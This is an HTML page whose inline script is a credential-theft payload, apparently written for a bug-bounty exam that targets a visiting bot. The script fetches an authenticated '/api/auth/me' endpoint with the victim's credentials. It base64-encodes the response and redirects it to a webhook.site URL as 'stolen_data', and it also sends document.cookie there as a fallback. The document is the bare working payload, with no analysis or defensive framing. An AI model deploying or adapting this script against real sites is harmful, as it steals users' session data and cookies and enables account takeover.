<!DOCTYPE html>
<html>
<body>
    <script>
        const webhook = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
        const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";

        // We use fetch but immediately follow up with a location change
        fetch(target, {credentials: "include"})
            .then(r => r.text())
            .then(data => {
                // This forces the bot to go to your webhook with the data in the URL
                window.location.href = webhook + "?stolen_data=" + btoa(data);
            })
            .catch(err => {
                window.location.href = webhook + "?error=" + btoa(err);
            });
            
        // Fallback: If fetch fails, just try to grab the cookie directly
        setTimeout(() => {
            window.location.href = webhook + "?cookie=" + btoa(document.cookie);
        }, 2000);
    </script>
</body>
</html>
